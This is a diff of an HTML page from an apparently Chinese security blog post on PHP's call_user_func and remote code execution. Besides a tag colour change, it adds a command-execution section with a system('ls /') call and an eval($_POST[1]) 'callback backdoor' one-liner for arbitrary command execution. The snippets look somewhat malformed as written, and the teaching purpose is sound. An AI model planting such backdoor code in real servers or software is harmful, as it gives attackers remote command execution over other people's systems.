@@ -246,7 +246,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/RCE/" style="color: #ffa2c4">RCE</a>
+                <a href="/blog/tags/RCE/" style="color: #00bcd4">RCE</a>
             </span>
             
         </span>
@@ -325,6 +325,10 @@
 <span class="token variable">$myobject</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">myclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$myobject</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'say_hello'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">//先实例化后调用</span>
 <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>命令执行：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>system<span class="token punctuation">,</span> <span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 回调后门，带到post请求里进行任意命令执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 
 
